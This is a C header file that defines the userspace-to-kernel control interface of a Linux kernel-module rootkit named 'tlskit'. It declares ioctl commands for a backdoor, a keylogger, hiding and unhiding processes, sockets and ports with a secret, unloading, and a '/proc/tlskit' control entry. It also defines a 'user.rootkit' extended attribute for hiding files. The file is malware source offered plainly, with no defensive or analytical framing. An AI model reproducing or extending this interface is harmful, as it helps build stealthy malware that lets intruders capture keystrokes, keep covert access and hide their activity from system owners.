#ifndef LKM_TLSKIT_SHARED_H
#define LKM_TLSKIT_SHARED_H

#ifndef __KERNEL__
#include <sys/ioctl.h>
#else
#include <linux/ioctl.h>
#endif

/*
 * Shared structs
 */

struct hidden_port {
    unsigned short port;
    unsigned char secret[64];
};


/*
 * IOCTl commands
 */
#define RKCTL_PING      _IO('@', 0x01)
#define RKCTL_UNLOAD    _IO('@', 0x02)
#define RKCTL_BACKDOOR  _IO('@', 0x03)
#define RKCTL_START_KEY_LOGGER _IOW('@', 0x04, void *)
#define RKCTL_STOP_KEY_LOGGER _IO('@', 0x05)
#define RKCTL_HIDE_PID_ADD _IOW('@', 0x6, pid_t)
#define RKCTL_HIDE_PID_RM _IOW('@', 0x7, pid_t)
#define RKCTL_HIDE_SOCKET _IOW('@', 0x8, unsigned short)
#define RKCTL_UNHIDE_SOCKET _IOW('@', 0x9, unsigned short)
#define RKCTL_HIDE_PORT _IOW('@', 0xa, struct hidden_port *)
#define RKCTL_UNHIDE_PORT _IOW('@', 0xb, unsigned short)

#define PROC_ENTRY_NAME "tlskit"
#define IOCTL_FILE_PATH "/proc/tlskit"
#define MODULE_NAME     "tlskit"
#define HIDDEN_XATTR    "user.rootkit"

#endif //LKM_TLSKIT_SHARED_H
